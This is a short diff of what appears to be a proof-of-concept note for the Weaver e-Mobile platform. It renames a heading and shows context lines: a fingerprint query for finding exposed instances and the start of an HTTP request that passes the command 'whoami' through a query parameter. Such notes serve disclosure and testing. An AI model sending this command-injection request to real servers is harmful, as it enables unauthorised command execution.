@@ -7,7 +7,7 @@
 app.name="泛微 e-Mobile 移动管理平台"
 ```
 
-## poc
+## POC
 ```plain
 GET /client/common/error?a=whoami HTTP/1.1
 Host: 
